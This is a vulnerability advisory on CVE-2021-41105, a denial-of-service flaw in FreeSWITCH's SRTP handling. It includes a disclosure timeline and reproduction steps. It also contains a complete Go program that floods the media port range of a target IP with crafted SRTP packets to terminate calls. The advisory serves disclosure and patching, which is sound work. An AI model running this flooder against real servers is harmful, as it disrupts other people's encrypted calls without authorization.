# FreeSWITCH susceptible to Denial of Service via invalid SRTP packets

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-09-freeswitch-srtp-dos
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-jh42-prph-gp36
- Other references: CVE-2021-41105
- Tested vulnerable versions: <= v1.10.6
- Timeline:
	- Report date: 2021-09-06
	- Triaged: 2021-09-10
	- Fix provided for testing: 2021-09-17
	- Vendor release with fix: 2021-10-24
	- Enable Security advisory: 2021-10-25

## TL;DR

When handling SRTP calls, FreeSWITCH is susceptible to a DoS where calls can be terminated by remote attackers. This attack can be done continuously, thus denying encrypted calls during the attack.

## Description

When a media port that is handling SRTP traffic is flooded with a specially crafted SRTP packet, the call is terminated leading to denial of service. This issue was reproduced when using the SDES key exchange mechanism in a SIP environment as well as when using the DTLS key exchange mechanism in a WebRTC environment.

The call disconnection occurs due to line 6331 in the source file `switch_rtp.c`, which disconnects the call when the total number of SRTP errors reach a hard-coded threshold (100):

```c
if (errs >= MAX_SRTP_ERRS) {
    // ...
    switch_channel_hangup(channel, SWITCH_CAUSE_SRTP_READ_ERROR);
}
```

## Impact

By abusing this vulnerability, an attacker is able to disconnect any ongoing calls that are using SRTP. The attack does not require authentication or any special foothold in the caller's or the callee's network.

## How to reproduce the issue

1. Prepare a FreeSWITCH instance that is publicly available and that can handle SRTP calls (`<X-PRE-PROCESS cmd="set" data="rtp_secure_media=true"/>`)
2. Prepare two SIP clients that can handle SRTP communication, such as Zoiper, and register against the FreeSWITCH instance
3. Prepare an attacker machine which has a different IP than that of the caller, callee or the FreeSWITCH instance
4. Save the below Go code and compile the application, naming it `freeswitch-srtp-dos`
5. Copy `freeswitch-srtp-dos` to the attacker machine
6. Perform a call between the agents using SRTP
7. Run the `freeswitch-srtp-dos` application against the target FreeSWITCH server: `./freeswitch-srtp-dos -ip <freeswitch_ip>`
8. Observe that when the active media ports are reached, FreeSWITCH will report "SRTP audio unprotect failed with code 21" multiple times, until the call is terminated

```go
package main

import (
	"flag"
	"fmt"
	"net"
)

func main() {
	var minport, maxport, count int
	var ip string

	flag.IntVar(&minport, "min-port", 16384, "port-range minimum value")
	flag.IntVar(&maxport, "max-port", 32768, "port-range maximum value")
	flag.IntVar(&count, "count", 200, "packet count per port")
	flag.StringVar(&ip, "ip", "", "target IPv4 address")
	flag.Parse()

	listener, err := net.ListenPacket("udp", "0.0.0.0:0")
	if err != nil {
		panic(err)
	}

	fmt.Printf("sending %d packets on each port, port range %d-%d\n",
		count, minport, maxport)

	addr := &net.UDPAddr{IP: net.ParseIP(ip)}
	for i := minport; i < maxport+1; i++ {
		fmt.Printf("\rattacking port: %d", i)
		addr.Port = i
		for j := 0; j < count; j++ {
			listener.WriteTo([]byte("\x80\x00p(\t\xcd-\x15\xfd>\\\x86A"), addr)
		}
	}
}
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> Instead of disconnecting the call, FreeSWITCH should simply ignore packets that fail message authentication or replay checks.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

